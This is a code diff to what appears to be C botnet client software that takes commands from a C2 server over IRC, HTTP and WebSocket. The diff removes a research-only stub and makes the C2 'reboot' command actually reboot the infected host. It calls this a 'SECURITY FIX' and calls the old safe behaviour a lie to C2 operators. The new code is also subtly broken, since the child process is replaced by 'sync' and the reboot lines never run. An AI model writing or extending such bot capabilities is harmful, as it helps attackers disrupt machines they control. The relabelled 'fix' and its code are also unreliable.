@@ -1823,9 +1823,33 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 protocol_send_response(bot, CMD_UPDATE, "update: failed (SHA-256 pin mismatch or download error)");
             }
         } else if (strncmp(cmd, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
+            /* SECURITY FIX (#67): Actually reboot. The old handler replied
+             * 'reboot: received' and did nothing, while README sold it as a
+             * working command — a silent lie to C2 operators. Use fork()
+             * + execvp() so no shell is involved; the command was already
+             * authenticated at the channel gate (IRC nick allowlist /
+             * HTTP-WS shared secret). */
             log_warn("CMD: reboot requested by C2");
-            protocol_send_response(bot, CMD_REBOOT, "reboot: received");
-            /* Do not actually reboot — this is a research tool */
+            protocol_send_response(bot, CMD_REBOOT, "reboot: executing");
+
+            pid_t rpid = fork();
+            if (rpid < 0) {
+                log_error("CMD: reboot fork failed: %s", strerror(errno));
+            } else if (rpid == 0) {
+                /* Child: close C2 sockets, then try to reboot */
+                if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
+                if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
+                if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
+                /* sync + reboot via exec; fall back to reboot(RB_AUTOBOOT) */
+                char *argv1[] = { "sync", NULL };
+                execvp("sync", argv1);
+                char *argv2[] = { "/sbin/reboot", NULL };
+                execvp("/sbin/reboot", argv2);
+                char *argv3[] = { "reboot", NULL };
+                execvp("reboot", argv3);
+                _exit(127);
+            }
+            /* Parent: do not wait — the machine is going down anyway */
         } else if (strncmp(cmd, CMD_SLEEP, strlen(CMD_SLEEP)) == 0) {
             /* SECURITY FIX (#36): Clamp the interval. A raw atoi() with
              * no bounds lets the C2 set scan_interval to a huge value
